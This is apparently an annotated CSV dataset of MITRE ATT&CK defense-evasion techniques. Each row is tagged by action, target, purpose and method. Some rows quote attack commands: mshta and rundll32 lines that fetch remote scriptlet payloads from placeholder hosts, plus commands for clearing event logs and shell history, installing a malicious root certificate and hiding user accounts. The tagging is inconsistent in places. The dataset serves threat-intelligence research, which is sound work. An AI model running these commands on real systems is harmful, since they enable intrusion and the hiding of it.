0,0,1,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,361,defense evasion,modify registry,t1112,use,remote access tool,,,,,<what>interact<\what> with the <where>registry<\where> ,interact,registry,windows api,,,,,,
,,,362,defense evasion,modify registry,t1112,modify,registry,,,,,<what>hide<\what> <where>keys<\where>,hide,keys,<what>prepending<\what> <where>key names<\where> with a <attribute>null character<\attribute>,,,,,,
,,,363,defense evasion,modify registry,t1112,modify,registry,remote system,"it requires the <condition><object>remote registry service<\object> to be running on the target system<\condition>  , <condition>valid accounts<\ condition > are required, along with <condition>access to the remote system's windows admin shares<\condition","<object>remote registry service<\object> to be running on the target system , valid accounts<\condition> are required, along with <condition>access to the remote system's windows admin shares",remote registry service,aid in execution of files as part of lateral movement,,,,,,,,,
,,,388,defense evasion,network share connection removal,t1126,use,net,,,,,<what>remove<\what> <where>network share connections<\where>,remove,network share connections,net use \system\share /delete command,,,,,,
,,,389,defense evasion,network share connection removal,t1126,remove,share connection,,,,,<what>clean up<\what> <where>traces<\where> of their operation,clean up,traces,,,,,,,
,,,330,defense evasion,lc_main hijacking,t1149,hijack,entry point for a binary,"lc_main , lc_thread , lc_unixthread",,,,"initial execution <what>flows<\what> to a malicious addition , <where>application whitelisting<\where> can be <what>bypassed<\what>","flows , bypassed",application whitelisting,<what>modifying<\what> a <where>binary<\where> in this(lc_main hijacking) way,,,,,,
,,,331,defense evasion,lc_main hijacking,t1149,modify,binary,,,,,,,,,,,,,,
,,,332,defense evasion,lc_main hijacking,t1149,bypass,whitelisting application,,,,,,,,,,,,,,
,,,477,defense evasion,process doppelganging,t1186,leverage,txf,,,,,<what>perform<\what> a file-less variation of process injection called <where>process doppelganging<\where>,perform,process doppelg?�nging,,,,,,,
,,,478,defense evasion,process doppelganging,t1186,replace,memory of a legitimate process,,,,,evade defenses and detection,,,,using,executable,,,,
,,,479,defense evasion,process doppelganging,t1186,enable ,code,,,,,evade defenses and detection,,,,,,,,,
,,,480,defense evasion,process doppelganging,t1186,use,txf,,,,,"<what>avoids<\what> the use of <where>highly-monitored api functions<\where> such as <where>ntunmapviewofsection<\where>, <where>virtualprotectex<\where>, and <where>setthreadcontext<\where>",avoids,"highly-monitored api functions , ntunmapviewofsection , virtualprotectex , setthreadcontext",,,,,,,
,,,481,defense evasion,process doppelganging,t1186,"create , overwrite , create , load , undo change , remove , create , initiate execute","txf transaction , file , shared section of memory , executable , executable , code , process","malicious code , tainted section of memory",,,,<what>evade<\what> <where>defenses<\where> and <where>detection<\where>,evade,"defense, detection",<what>using<\what> a legitimate <where>executable<\where>,,,,,,
,,,706,defense evasion,template injection,t1221,use,template injection,,,,,<what>conceal<\what> malicious <where>code<\where> to be executed via documents,conceal,code,,,,,,,
,,,707,defense evasion,template injection,t1221,inject template reference,document,,the <condition><object>document<\object> is loaded<\condition>,<object>document<\object> is loaded,document,"enable malicious <what>payloads <\what> to be <what>fetched<\what> and <what>executed<\what> , evade static detections","payloads  , fetched , executed",,"spearphishing attachment , taint shared content",injecting,smb/https (or other credential prompting) url,,,,
,,,708,defense evasion,template injection,t1221,enable,payload,,,,,,,,,,,,,,
,,,709,defense evasion,template injection,t1221,execute,payload,,,,,,,,,,,,,,
,,,710,defense evasion,template injection,t1221,"enable , trigger","forced authentication , authentication attempt",,,,,,,,<what>injecting<\what> a <where>smb/https (or other credential prompting) url<\where>,,,,,,
,,,244,defense evasion ,file system logical offsets,t1006,read and write,files,,programs with direct access,,,<what> bypasses <\what> <attribute> windows file <\attribute> <where> access controls <\where> as well as <attribute> file system monitoring tools <\attribute>,bypasses,access controls,analyzing file system data structures  ninjacopy  powershell,,,,,,
,,,57,defense evasion ,binary padding,t1009,add,data,files,,,,<what> increase <\what> the <where> size <\where>  <what> change <\what> the <where> file hash <\where> avoid hash-based blacklists,"increase  ,  change","size  ,  file hash",,,,,,,
,,,282,defense evasion ,indicator blocking,t1054,block,indicators,,,,,,,,,,,,,,
,,,283,defense evasion ,indicator blocking,t1054,modifying,events,captured by sensors,,,,gathered and analyzed.,,,,,,,,,
,,,284,defense evasion ,indicator blocking,t1054,block,"sensor settings  ,  registry keys",stored in configuration files,,,,disable or maliciously redirect event telemetry,,,,,,,,,
,,,285,defense evasion ,indicator blocking,t1054,,traffic,,,,,prevent central analysis  forwarding telemetry  creating a host-based firewall rule,,,<what> stopping <\what> a local <where> process <\where>,stopping,process,,,,
,,,286,defense evasion ,indicator removal from tools,t1066,modify,tool,malicious,,,,,,,removing the indicator,,,,,,
,,,287,defense evasion ,indicator removal from tools,t1066,use,updated version,,,,,,,,,,,,,,
,,,288,defense evasion ,indicator removal from tools,t1066,use,software packing,,,,,,,,,,,,,,
,,,289,defense evasion ,indicator removal from tools,t1066,modify,file,,,,,different signature,,,,,,,,,
,,,290,defense evasion ,indicator removal on host,t1070,"delete  ,  alter",artifacts,,,,,,,,,,,,,,
,,,291,defense evasion ,indicator removal on host,t1070,compromise,"logs  , captured files",,,,,,,,,,,,,,
,,,292,defense evasion ,indicator removal on host,t1070,performing,integrity of security solutions,,,,,,,,,,,,,,
,,,293,defense evasion ,indicator removal on host,t1070,clear,actions,"account management, account logon and directory service access",,,,,,,,,,,,,
,,,294,defense evasion ,indicator removal on host,t1070,cleared,"events  ,  logs",,,,,hide their activities,,,wevtutil cl systemwevtutil cl applicationwevtutil cl security powershell,,,,,,
,,,176,defense evasion ,dll side-loading,t1073,use,program,vulnerable  to side-loading,,,,<what> load <\what> a <attribute> malicious <\attribute> <where> dll <\where>,load,dll,,,,,,,
,,,177,defense evasion ,dll side-loading,t1073,use,dll side-loading,,,,,"masking actions they perform under a legitimate, trusted system or software process",,,,,,,,,
,,,165,defense evasion ,disabling security tools,t1089,disable,security tools,,,,,avoid possible detection of their tools and activities  tools do not start at run time  interfere with security scanning or event reporting,,,"<what> killing <\what> <where> security software <\where> or <what>log<\where> <where> event processes <\where> logging processes, <what> deleting <\what> <where> registry keys <\where>","killing  , log<\where> <where> event processes <\where> logging processes, <what> deleting","security software  ,  registry keys",,,,
,,,242,defense evasion ,file deletion,t1107,remove,files,,,,,keep their footprint low  remove them at the end as part of the post-intrusion cleanup process,,,"tools available    del, secure deletion tools such as windows sysinternals sdelete, or other third-party file deletion tools",,,,,,
,,,91,defense evasion ,code signing,t1116,use,code signing certificates,,,,,masquerade malware and tools as legitimate binaries,,,,,,,,,
,,,92,defense evasion ,code signing,t1116,created,certificates,,,,,,,,,,,,,,
,,,93,defense evasion ,code signing,t1116,"forged  ,  stolen",code signing,,,,,verify software on first run,,,,,,,,,
,,,94,defense evasion ,code signing,t1116,use,code signing certificates,,,,,,,,,,,,,,
,,,95,defense evasion ,code signing,t1116,use,,,,,,<what> bypass <\what> <where> security policies <\where> <why> that <when>require signed code <\when>to <why> execute on a system,bypass,security policies,,,,,,,
,,,314,defense evasion ,install util,t1118,use,installutil,,,,,<what> proxy execution <\what> of <where> code <\where>,proxy execution,code,trusted windows utility,,,,,,
,,,315,defense evasion ,install util,t1118,,installutil,,,,,<what> bypass <\what> <where> process whitelisting <\where>,bypass,process whitelisting,<what> use <\what> of attributes within the <where> binary <\where> that <what> execute <\what> the <where> class <\where> decorated with the attribute [system.componentmodel.runinstaller(true)],"use  ,  execute","binary  ,  class",,,,
,,,301,defense evasion ,install root certificate,t1130,install,root certificate,,,,,<what>degrade<\what> the <where>security of that system<\where>,degrade,security of that system,,,,,,,
,,,302,defense evasion ,install root certificate,t1130,use,install root certificate,,compromised systems <condition>connect over https to adversary controlled web servers<\condition>,connect over https to adversary controlled web servers,,"avoid security warnings prompting users , <what>collect<\what> <where>login credentials<\where>",collect,login credentials,,,,,,,
,,,303,defense evasion ,install root certificate,t1130,avoid/bypass,security warning,,,,,,,,,,,,,,
,,,304,defense evasion ,install root certificate,t1130,collect,login credential,,,,,,,,,,,,,,
,,,305,defense evasion ,install root certificate,t1130,use,root certificate,malware/adware,,,,provide a man-in-the-middle capability for <what>intercepting<\what> <where>information<\where> transmitted over secure tls/ssl communications,intercepting,information,,,,,,,
,,,306,defense evasion ,install root certificate,t1130,intercept,information,,,,,,,,,,,,,,
,,,307,defense evasion ,install root certificate,t1130,"clone , reinstall , use","root certificates , root certificates , cloned certificate",,,,,"<what>sign<\what> malicious <where>code<\where> ,  <what>bypass<\what> <where>signature validation tools<\where> (ex: <where>sysinternals<\where>, <where>antivirus<\where>, etc.) ","sign , bypass","code , signature validation tools , sysinternals , antivirus",,,,,,,
,,,308,defense evasion ,install root certificate,t1130,sign,code,,,,,,,,,,,,,,
,,,309,defense evasion ,install root certificate,t1130,bypass,signature validation tool,,,,,,,,,,,,,,
,,,310,defense evasion ,install root certificate,t1130,bypass,antivirus,,,,,,,,,,,,,,
,,,311,defense evasion ,install root certificate,t1130,bypass,sysinternals,,,,,,,,,,,,,,
,,,312,defense evasion ,install root certificate,t1130,use,command,/usr/bin/security add-trusted-cert -d -r trustroot -k /library/keychains/system.keychain /path/to/malicious/cert,,,,<what>install<\what> a malicious <where>certificate<\where>,install,certificate,,,,,,,
,,,313,defense evasion ,install root certificate,t1130,install,certificate,,,,,,,,,,,,,,
,,,2,defense evasion ,access token manupulation,t1134,use,access tokens,,,,,operate under a different user or system security context perform actions and <what> evade <\what> <where> detection <\where>,evade,detection,,,,,,,
,,,3,defense evasion ,access token manupulation,t1134,use,windows api,built-in functions,be in a privileged user context (i.e. administrator),,,<what>  copy <\what><where> access tokens <\where> from existing processes; this is known as token stealing  <what> steal <\what> a <where> token <\where>,"copy  ,  steal","access tokens  ,  token",,,,,,,
,,,4,defense evasion ,access token manupulation,t1134,use,token stealing,,,,,elevate their security context from the administrator level to the system level,,,,,,,,,
,,,5,defense evasion ,access token manupulation,t1134,use,token,,<object>account<\object> has <condition>appropriate permissions<\condition> on the remote system,appropriate permissions,account,authenticate to a remote system,,,,,,,,,
,,,6,defense evasion ,access token manupulation,t1134,leveraged/use,access tokens,,,,,,,,,,,,,,
,,,7,defense evasion ,access token manupulation,t1134,creates,access token,new,,,,,,,,,,,,,
,,,8,defense evasion ,access token manupulation,t1134,duplicates,existing token,,the target user has a non-network logon session on the system,,,impersonate a logged on user's security context  assign the impersonated token to a thread,,,duplicatetoken(ex)  impersonateloggedonuser  setthreadtoken,,,,,,
,,,9,defense evasion ,access token manupulation,t1134,creates,access token,new,,,,<what>create <\what> a new <where> process <\where> running under the security context of the impersonated user,create,process,duplicatetoken(ex)  createprocesswithtokenw,,,,,,
,,,10,defense evasion ,access token manupulation,t1134,create,logon session,,,,,assign the token to a thread,,,logonuser  <what> use <\what> <where> setthreadtoken <\where>,use,setthreadtoken,,,,
,,,11,defense evasion ,access token manupulation,t1134,allows,token manipulation,,,,,,,,,,,,,,
,,,12,defense evasion ,access token manupulation,t1134,uses,token impersonation,,,,,escalate privileges,,,,,,,,,
,,,161,defense evasion ,deobfuscate/decode files or information,t1140,use,obfuscated files or information,,<condition> require <\condition> <object> separate mechanisms <\object>,require,separate mechanisms,hide artifacts of an intrusion from analysis  decode or deobfuscate that information depending on how they intend to use it  <what>decode<\what> a <where>remote access tool<\where> portable executable file that has been hidden inside a certificate file.reassemble binary fragments into a malicious payload,decode,remote access tool,"built-in functionality of malware, scripting, powershell, or by using utilities present on the system  <what> use <\what> of <where> certutil <\where>   <what> using <\what> the <where> windows copy /b command<\where>","use  ,  using","certutil  ,  windows copy /b command",,,,
,,,162,defense evasion ,deobfuscate/decode files or information,t1140,"compressed, archived, or encrypted",payloads,,required to open it obfuscated files or information  input a password,,,avoid detection  deobfuscation or decryption as part of <tech> user execution <\tech>  open a password protected compressed/encrypted file that was provided by the adversary,,,,,,,,,
,,,163,defense evasion ,deobfuscate/decode files or information,t1140,use,scripts,compressed or archived,,,,,,,,,,,,,
,,,164,defense evasion ,deobfuscate/decode files or information,t1140,,javascript,,,,,,,,,,,,,,
,,,269,defense evasion ,hidden window,t1143,abuse/use,hidden files,,applications run in the system tray,,,,,,,,,,,,
,,,270,defense evasion ,hidden window,t1143,hide,running window,,,,,,,,,,,,,,
,,,259,defense evasion ,gatekeeper bypass,t1144,bypasses,gatekeeper,,,,,,,,xattr command xattr /path/to/myapp.app for com.apple.quarantine,,,,,,
,,,83,defense evasion ,clear command history,t1146,accessed,logs,,,,,,,,,,,,,,
,,,84,defense evasion ,clear command history,t1146,searching,files,,,,,cleartext passwords,,,,,,,,,
,,,85,defense evasion ,clear command history,t1146,use,command,,,,,prevent their own commands from appear in these logs,,,"unset histfile, export histfilesize=0, history -c, rm ~/.bash_history",,,,,,
,,,268,defense evasion ,hidden users,t1147,hide,user accounts,,enabling this property (setting it to yes),,,,,,the <tech> create account <\tech> technique with a userid under 500  sudo dscl . -create /users/username uniqueid 401,,,,,,
,,,271,defense evasion ,histcontrol,t1148,use,histcontrol,,,,,hide tracesoperate without leaving traces by simply prepending a space to all of their terminal commands,,,ignoredups ignoreboth,,,,,,
,,,364,defense evasion ,mshta,t1170,use,mshta.exe,,,,,<what> proxy execution <\what>of <attribute> malicious  .hta <\attribute> <where> files <\where> and <where> javascript<\where> or <where>vbscript <\where>,proxy execution,"files  ,  javascript , vbscript",trusted windows utility,,,,,,
,,,365,defense evasion ,mshta,t1170,leveraging/use,mshta.exe,,,,,<what> execution <\what> of <where> code <\where>,execution,code,initial compromise,,,,,,
,,,366,defense evasion ,mshta,t1170,executed,files,mshta.exe,,,,,,,inline script: mshta vbscript:close(execute(getobject(script:https[:]//webserver/payload[.]sct))),,,,,,
,,,367,defense evasion ,mshta,t1170,executed,files,,,,,,,,urls: mshta http[:]//webserver/payload[.]hta,,,,,,
,,,368,defense evasion ,mshta,t1170,use,mshta.exe,,,,,<what> bypass <\what> <where> application whitelisting solutions <\where>,bypass,application whitelisting solutions,,,,,,,
,,,369,defense evasion ,mshta,t1170,executes,mshta.exe,,,,,,,,<attribute> outside of the internet explorer's <\attribute> <where> security context <\where>,,security context,,,,
,,,370,defense evasion ,mshta,t1170,bypasses,security settings,browser,,,,,,,,,,,,,
,,,87,defense evasion ,cmstp,t1191,supply,cmstp.exe,,,,,,,,inf files infected with malicious commands,,,,,,
,,,88,defense evasion ,cmstp,t1191,abuse / use,cmstp.exe,,,,,<what> load <\what> and <what> execute <\what> <where> dlls <\where>  and/or <where> com scriptlets (sct) <\where> from remote servers  <what> bypass <\what> <where> applocker <\where> and other <where> whitelisting defenses <\where>,"load  ,  execute  ,  bypass","dlls  ,  com scriptlets (sct)  ,  applocker  ,  whitelisting defenses",,,,,,,
,,,89,defense evasion ,cmstp,t1191,abuse <\where> to <why> <tech> bypass user account control <\tech> <\why> and <what> execute,cmstp.exe,,,,,,,,,,,,,,
,,,90,defense evasion ,cmstp,t1191,,commands,malicious inf,,,,,,,auto-elevated com interface,,,,,,
,,,114,defense evasion ,control panel items,t1196,use,control panel items,execution payloads,,,,<what> execute <\what> arbitrary <where> commands <\where>,execute,commands,,,,,,,
,,,115,defense evasion ,control panel items,t1196,delivered,control panel items,spearphishing attachment,,,,,,,,,,,,,
,,,116,defense evasion ,control panel items,t1196,executed,control panel items,,,,,<what> bypass <\what> <where> application<\where> and/or <where>file extension whitelisting<\where>,bypass,"application , file extension whitelisting",,,,,,,
,,,58,defense evasion ,bits jobs,t1197,abuse/use,bits,,,,,"download, execute, and even clean up after running malicious code",,,,,,,,,
,,,59,defense evasion ,bits jobs,t1197,use,bits execution,,,,,persistence,,,creating long-standing jobs (the default maximum lifetime is 90 days and extendable)  invoking an arbitrary program when a job completes or errors (including after system reboots),,,,,,
,,,60,defense evasion ,bits jobs,t1197,use,bits upload functionalities,,,,,<what> perform <\what> <where> <tech> exfiltration over alternative protocol <\tech> <\where>,perform,<tech> exfiltration over alternative protocol <\tech>,,,,,,,
,,,295,defense evasion ,indirect command execution,t1202,abuse/use,windows utilities,,,,,defense evasion  perform arbitrary execution while subverting detections  mitigation controls (such as group policy) that limit/prevent the usage of cmd  file extensions more commonly associated with malicious payloads.,,,,,,,,,
,,,159,defense evasion ,dcshadow,t1207,manipulate/use,"active directory (ad) data/objects and schemas,the krbtgt hash",,once registered requires  administrator privileges,,,"<what> inject <\what> and <what> replicate <\what> changes into <where> ad infrastructure<\where> for any <atrribute> domain object <\attribute>, including <where> credentials and keys <\where>","inject  ,  replicate","ad infrastructure ,  credentials and keys",registering (or reusing an inactive registration) and simulating the behavior of a domain controller (dc),,,,,,
,,,160,defense evasion ,dcshadow,t1207,use,dcshadow,,,,,"<what> alter <\what> and <what> delete <\what> <where> replication and other associated metadata <\where> to <why> obstruct forensic analysis;<what> perform <\what> <where> <tech> sid-history injection <\tech> <\where> and/or <what> manipulate <\what> <where> ad objects<\where> (such as<where> accounts<\where>, <where>access control lists<\where>, <where>schemas<\where>) <\where>  establish backdoors for persistence","alter/delete; perform  ,  manipulate","replication and other associated metadata; <tech> sid-history injection <\tech>  ,  ad objects ,  accounts , access control lists , schemas",,,,,,,
,,,218,defense evasion ,exploitation for defense evasion,t1211,use/abuse/takes advantage,programming error,"program, service  ,  operating system software  ,  kernel",have prior knowledge,,,<what> execute <\what> <where> adversary-controlled code <\where>,execute,adversary-controlled code,reconnaissance,,,,,,
,,,219,defense evasion ,exploitation for defense evasion,t1211,targeted/use,security software,,,,,exploitation,,,,,,,,,
,,,243,defense evasion ,file permissions modification,t1222,modify,file permissions/attributes,,require taking ownership of a file and/or elevated permissions such as administrator/root depending on the file's existing permissions,,,"evade intended dacls  enable malicious activity such as <what> modifying, replacing, or deleting <\what> specific <where>files<\where>","modifying, replacing, or deleting",files,changing specific access rights,,,,,,
,,,103,defense evasion ,compiled html file,t1223,loaded,program (hh.exe),html help executable,,,,,,,,,,,,,
,,,104,defense evasion ,compiled html file,t1223,abuse/use,this technology,,,,,<what> conceal <\what> <where> malicious code <\where>,conceal,malicious code,,,,,,,
,,,105,defense evasion ,compiled html file,t1223,delivered,payloads,,,,,,,,,,,,,,
,,,106,defense evasion ,compiled html file,t1223,triggered,<tech> user execution <\tech>,,,,,<what> bypass <\what> <where> application whitelisting <\where>  on older and/or <attribute> unpatched <\attribute><where>  systems <\where> that do not account for execution of binaries through hh.exe,bypass,"application whitelisting  ,   systems",,,,,,,
,,,199,defense evasion ,execution guardrails,t1480,use,guardrails,,,,,,,,,,,,,,
,,,200,defense evasion ,execution guardrails,t1480,use,"environmental keying  ,  environmental keying",,,,,help protect their ttps and evade detection deliver an encrypted payload to the target,,,,,,,,,
,,,201,defense evasion ,execution guardrails,t1480,use,target-specific values,,,,,decrypt the payload before execution,,,,,,,,,
,,,202,defense evasion ,execution guardrails,t1480,avoid packaging,decryption key,,,,,,,,,,,,,,
,,,261,defense evasion ,group policy modification,t1484,modify,group policy objects (gpos),,,,,subvert the intended discretionary access controls for a domain,,,,,,,,,
,,,262,defense evasion ,group policy modification,t1484,use,gpo modifications,,,,,"implement scheduled task, disabling security tools, remote file copy, create account, service execution",,,,,,,,,
,,,263,defense evasion ,group policy modification,t1484,leveraged/use,scripts,,,,,automate the creation of a malicious scheduled task,,,new-gpoimmediatetask  <what>modifying <\what> <where>gpo settings<\where>,modifying,gpo settings,,,,
,,,264,defense evasion ,group policy modification,t1484,modify,user rights,seenabledelegationprivilege,,,,achieve a subtle ad backdoor,,,<gpo_path>\machine\microsoft\windows nt\secedit\gpttmpl.inf,,,,,,
,,,100,defense evasion ,compile after delivery,t1500,hide/difficult to discover,payloads,,,,,,,,<what>delivering <\what> <where>files<\where> to victims as uncompiled code,delivering,files,,,,
,,,101,defense evasion ,compile after delivery,t1500,compiled,payloads,,,,,,,,csc.exe or gcc/mingw,,,,,,
,,,102,defense evasion ,compile after delivery,t1500,"encrypted, encoded, and/or embedded",payloads,,,,,,,,,,,,,,
,,,749,"defense evasion,discovery",virtualization/sandbox evasion,t1497,check presence,virtual machine environment (vme) ,,,,,<what>avoid <\what>potential detection of tools and activities,avoid ,,,"searching , use , use","security monitoring tools , sysinternals , wireshark , sleep timers , loops ",,,,
,,,750,"defense evasion,discovery",virtualization/sandbox evasion,t1497,search,sandbox,,,,,<what>avoid <\what>potential detection of tools and activities,avoid ,,,,,,,,
,,,751,"defense evasion,discovery",virtualization/sandbox evasion,t1497,search,vme artifact,,,,,<what>avoid <\what>potential detection of tools and activities,avoid ,,,,,,,,
,,,752,"defense evasion,discovery",virtualization/sandbox evasion,t1497,use,security software discovery,,,,,"<what>determine<\what> if it is an analysis environment , <what>avoid operating<\what> within a temporary <where>sandboxes<\where>","determine , avoid operating",sandboxes,"<what>searching<\what> for <where>security monitoring tools<\where> (e.g., <where>sysinternals<\where>, <where>wireshark<\where>, etc.)  , <what>use<\what> of <where>sleep timers<\where> ,  <what>use<\what> of <where>loops <\where> within malware code",,,,,,
,,,753,"defense evasion,discovery",virtualization/sandbox evasion,t1497,use,utilities,,,,,,,,,,,,,,
,,,754,"defense evasion,discovery",virtualization/sandbox evasion,t1497,search,"windows management instrumentation , powershell , systeminfo , query registry",,,,,"<what>obtain<\what> <where>system information<\where> , <what>search<\what> for <where>vme artifacts<\where>","obtain , search","system information , vme artifacts",,using,win32 deviceiocontrol function,,,,
,,,755,"defense evasion,discovery",virtualization/sandbox evasion,t1497,"use , exit","vme artifact  , program","memory , processes , file system , registry",it <condition>determines the <object>system<\object> to be a virtual environment<\condition>,determines the <object>system<\object> to be a virtual environment,system,<what>combine<\what> these <where>checks<\where> into one script,combine,checks,,,,,,,
,,,756,"defense evasion,discovery",virtualization/sandbox evasion,t1497,use,i/o port,,,,,send commands and receive output,,,,,,,,,
,,,757,"defense evasion,discovery",virtualization/sandbox evasion,t1497,check,drive size,"hklm\software\oracle\virtualbox guest additions , hklm\hardware\description\system\systembiosversion;vmware  , hklm\hardware\acpi\dsdt\box_ , example vme files and dlls on the system[2]  , windows\system32\drivers\vmmouse.sys , windows\system32\vboxhook.d",,,,,,,<what>using<\what> the <where>win32 deviceiocontrol function<\where>,,,,,,
,,,758,"defense evasion,discovery",virtualization/sandbox evasion,t1497,search,user activity,"browser history , cache , bookmarks , number of files in the home directories",,,,reassurance of an authentic environment,,,,"waiting , waiting",,,,,
,,,759,"defense evasion,discovery",virtualization/sandbox evasion,t1497,detect,information,,,,,,,,"user interaction , digital signatures",,,,,,
,,,760,"defense evasion,discovery",virtualization/sandbox evasion,t1497,check,speed of mouse click,,,,,,,,,,,,,,
,,,761,"defense evasion,discovery",virtualization/sandbox evasion,t1497,check,frequency of mouse click,,,,,<what>determine<\what> if it's a sandboxed environment,determine,,"<what>waiting<\what> for a document to close before activating a macro , <what>waiting<\what> for a user to double click on an embedded image to activate",using,wmi query,,,,
,,,762,"defense evasion,discovery",virtualization/sandbox evasion,t1497,check,fan of the system,,,,,,,,,,,,,,trusted developer utilities
,,,763,"defense evasion,discovery",virtualization/sandbox evasion,t1497,check,temperature of the system,,,,,<what>gather<\what> <where>evidence<\where> that can be indicative a virtual environment,gather,evidence,,use,embedded script,,,,
,,,764,"defense evasion,discovery",virtualization/sandbox evasion,t1497,check,cpu ,,,,,,,,<what>using<\what> a <where>wmi query<\where> $q = select * from win32_fan get-wmiobject -query $q,,,,,,
,,,559,"defense evasion,execution",rundll32,t1085,use,rundll32.exe,,,,,"proxy <what>execution<\what> of <where>code<\where> , avoid <what>triggering<\what> <where>security tools<\where>","execution , triggering","code , security tools",,,,,,,
,,,560,"defense evasion,execution",rundll32,t1085,use,rundll32.exe,,,,,<what>execute<\what> <where>control panelitem files (.cpl) <\where> ,execute,control panelitem files (.cpl) ,undocumented shell32.dll functions control_rundll and control_rundllasuser,,,,,,
,,,561,"defense evasion,execution",rundll32,t1085,use,rundll32.exe,,,,,<what>execute<\what> <where>scripts<\where> such as <where>javascript<\where>,execute,"scripts , javascript","rundll32.exe javascript:..\mshtml,runhtmlapplication ;document.write();getobject(script:https[:]//www[.]example[.]com/malicious.sct) ",,,,,,
,,,562,"defense evasion,execution",rundll32,t1085,execute,script/javascript,,,,,,,,,,,,,,
,,,563,"defense evasion,execution",rundll33,t1085,execute,code,,,,,,,,,,,,,,
,,,564,"defense evasion,execution",rundll33,t1085,trigger,security tool,,,,,,,,,,,,,,
,,,524,"defense evasion,execution",regsvr32,t1117,use,regsvr32.exe,,,,,"proxy <what>execution<\what> of <where>code<\where> , avoid <what>triggering<\what> <where>security tools<\where>","execution , triggering","code , security tools",,using,functionality to load com scriptlets,,,,
,,,525,"defense evasion,execution",regsvr32,t1117,proxy execute,code,,,,,,,,,,,,,,
,,,526,"defense evasion,execution",regsvr32,t1117,trigger,security tool,,,,,,,,,,,,,,
,,,527,"defense evasion,execution",regsvr32,t1117,use,regsvr32.exe,,,,,"<what>bypass<\what> <where>process whitelisting<\where> , <what>execute<\what> <where>dlls<\where> under user permissions","bypass , execute","process whitelisting , dlls",<what>using<\what> <where>functionality to load com scriptlets<\where>,passing,uniform resource locator (url) ,,,,
,,,528,"defense evasion,execution",regsvr32,t1117,bypass,process whitelisting tool,,,,,,,,,,,,,,
,,,529,"defense evasion,execution",regsvr32,t1117,execute,DLL,,,,,,,,,,,,,,
,,,530,"defense evasion,execution",regsvr32,t1117,load,script,,,,,squiblydoo attack,,,<what>passing/sending<\what> a <where>uniform resource locator (url) <\where> to <attribute>file<\attribute> on an external web server as an argument during invocation,,,,,,
,,,531,"defense evasion,execution",regsvr32,t1117,send/pass,URL ,of a malicious file ,,,,,,,,,,,,,
,,,532,"defense evasion,execution",regsvr32,t1117,use,regsvr32.exe,,,,,<what>register<\what> a <where>com object<\where> used to establishpersistence,register,com object,component object model hijacking. ,,,,,,
,,,533,"defense evasion,execution",regsvr32,t1117,register,COM object,,,,,,,,,,,,,,
,,,643,"defense evasion,execution",space after filename,t1151,hide,filetype,,,,,,,,<what>changing<\what> the <where>extension<\where> of a file,,,,,,
,,,644,"defense evasion,execution",space after filename,t1151,chage,file extension,,,,,,,,,,,,,,
,,,645,"defense evasion,execution",space after filename,t1151,use, space after filename,,,,,trick users into double clicking benign-looking files,,,,,,,,,
,,,646,"defense evasion,execution",space after filename,t1151,double click,file,,,,,,,,,,,,,,
,,,642,"defense evasion,execution",source,t1153,execute,source,"source /path/to/filename [arguments]  ,  . /path/to/filename [arguments] ",,,,,,,"source /path/to/filename [arguments]  ,  . /path/to/filename [arguments] ",,,,,,
,,,371,"defense evasion,execution",mshta,t1170,use,mshta.exe,,,,,proxy <what>execution <\what> of malicious <where>.hta files<\where> and <where>javascript<\where> or <where>vbscript<\where>,execution ,".hta files , javascript , vbscript",trusted windows utility,,,,,,
,,,372,"defense evasion,execution",mshta,t1170,proxy execute,.hta file,,,,,,,,trusted windows utility,use,mshta.exe in inline script,,,,
,,,373,"defense evasion,execution",mshta,t1170,proxy execute,javascript,,,,,,,,trusted windows utility,use,mshta.exe with url in command,,,,
,,,374,"defense evasion,execution",mshta,t1170,proxy execute,VBScript ,,,,,,,,trusted windows utility,,,,,,
,,,375,"defense evasion,execution",mshta,t1170,execute,file,,,,,,,,mshta.exe through an inline script: mshta vbscript:close(execute(getobject(script:https[:]//webserver/payload[.]sct))),,,,,,
,,,376,"defense evasion,execution",mshta,t1170,execute,file,,,,,,,,urls: mshta http[:]//webserver/payload[.]hta,,,,,,
,,,377,"defense evasion,execution",mshta,t1170,use,mshta.exe,,,,,"<what>bypass<\what> <where>application whitelisting solutions <\where> , <what>bypasses<\what> <where>browser security settings<\where>","bypass , bypasses","application whitelisting solutions  , browser security settings",,,,,,,
,,,378,"defense evasion,execution",mshta,t1170,bypass,browser security setting,,,,,,,,,,,,,,
,,,379,"defense evasion,execution",mshta,t1170,bypass,application whitelisting solution,,,,,,,,,,,,,,
